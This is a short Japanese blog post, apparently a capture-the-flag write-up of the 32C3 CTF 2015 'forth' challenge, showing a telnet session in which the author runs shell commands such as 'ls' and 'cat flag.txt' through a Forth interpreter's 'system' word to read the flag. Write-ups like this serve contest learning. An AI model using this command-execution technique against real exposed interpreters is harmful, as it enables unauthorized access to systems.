---
layout: post
alias: "/blog/2016/01/02/32c3-ctf-forth/"
title: "32C3 CTF forth"
date: 2016-01-02T23:19:54+09:00
tags: [ "ctf", "pwn", "writeup", "forth", "xinetd" ]
---

## [pwn 150: forth](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/forth-150)

>   Connect to 136.243.194.49:1024 and get a shell.

本番中に解けた。

forthのinterpreterに繋がっているので、`system`を叩けばよい。
真面目にforthの命令で出力させようとして、`[open-file] error(2): unknown word.`とか言われforthのmanual読みながら頑張っていたりしたので、それなりに苦労した。

``` sh
$ telnet 136.243.194.49 1024
Trying 136.243.194.49...
Connected to 136.243.194.49.
Escape character is '^]'.
yForth? v0.2  Copyright (C) 2012  Luca Padovani
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions; see LICENSE for details.
s" ls" system
flag.txt  README.gpl  run.sh  yforth
ok
ok
s" cat flag.txt" system
32C3_a8cfc6174adcb39b8d6dc361e888f17b
ok
ok
^]
telnet> quit
Connection closed.
```
